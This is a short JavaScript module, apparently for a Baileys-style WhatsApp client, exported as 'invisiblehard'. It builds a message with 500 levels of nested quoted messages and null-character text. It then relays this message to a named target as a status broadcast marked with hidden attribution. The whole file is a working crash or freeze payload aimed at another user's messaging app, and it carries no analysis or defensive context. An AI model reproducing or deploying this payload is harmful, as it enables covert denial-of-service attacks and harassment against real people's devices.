const crypto = require("crypto");

function buildNested(depth) {
    let inner = { conversation: "\0" };
    for (let i = 0; i < depth; i++) {
        inner = {
            extendedTextMessage: {
                text: "\0",
                contextInfo: { quotedMessage: inner }
            }
        };
    }
    return inner;
}

module.exports = async function invisiblehard(sock, target) {
    const payload = {
        extendedTextMessage: {
            text: "\0",
            contextInfo: { quotedMessage: buildNested(500) }
        }
    };

    await sock.relayMessage("status@broadcast", payload, {
        messageId: crypto.randomBytes(16).toString("hex").toUpperCase(),
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: { appdata: "default" },
                content: [
                    { tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] },
                    { tag: "status_attribution", attrs: { hidden: "true" }, content: [] }
                ]
            }
        ]
    });
};
